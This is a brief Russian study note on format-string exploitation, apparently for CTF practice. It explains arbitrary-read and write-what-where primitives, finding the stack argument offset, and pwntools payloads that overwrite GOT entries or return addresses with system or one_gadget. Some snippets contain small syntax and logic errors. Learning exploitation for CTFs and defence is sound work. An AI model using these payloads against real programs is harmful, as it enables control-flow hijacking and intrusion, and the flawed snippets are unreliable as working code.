# Arbitrary Read
Read примитив - возможность прочитать важный для эксплуатации указатель из памяти программы путём чтения по определённому адресу.
``` C
read_prim(void* откуда_читаем)
```
Откуда можно читать:
- Стек: адреса из бинаря, libc, стека;
-  Бинарь:  .got.plt, .bss.

##### Пример
Сначала найти номер аргумента.
Чтение:
``` python
payload = b'>|%9$s|<__addr__  # чтение уже строки по адресу addr
io.send(payload)
```

# WWW (Write-Whar-Where)
Write примитив - возможность записи данных по указанному адресу.
``` C
WWW_prim(int что_пишем, void* куда_пишем)
```
Куда можно писать:
- Если имеется libc base: перезаписать .got.plt на system/one_gadget/шеллкод;
- Если имеется адрес стека: перезаписать адрес возврата на system/one_gadget/шеллкод/ROP.

##### Пример:
Сначала найти номер аргумента.
Запись:
``` python
target_addr = 0x404018 
value_to_write = 0x4011f6 

# Самый простой способ через pwntools: 
payload = fmtstr_payload(10, {target_addr: value_to_write}) 

# Или вручную (упрощенно): 
# %<число>c — печатает нужное кол-во байт, чтобы счетчик стал равен value 
# %10$n — берет адрес из 10-го аргумента и пишет туда значение счетчика 
payload = f"%{value_to_write}c%10$n".encode().ljust(16, b'A') + p64(target_addr) io.sendline(payload)
```

# Поиск номера аргумента
Можно использовать уязвимость форматной строки, использовать %p для поиска элемента на стеке и %s для вывода.
``` C
printf(buf);
```

Сначала необходимо найти по какому адресу на стеке записываются элементы, делать это можно брутфорсом (брутить 0x4141414141414141). После нахождения такого %n$p можно перейти к AR или WWW.

``` python
payload = b'>|%9$p|<AAAAAAAA
io.send(payload)
```
Стек:
```
arg8 = >|%9$p|<     <- выравнен по 8 байт
arg9 = AAAAAAAA     <- выведится
```

Пример:
``` python
for i in range(100):
    io = start()
    payload = f'AAAAAAAA.%{i}$p'
    s = io.recvline().decode()
    if '41' * 8 in s:
        print(i, s)
        break 
```
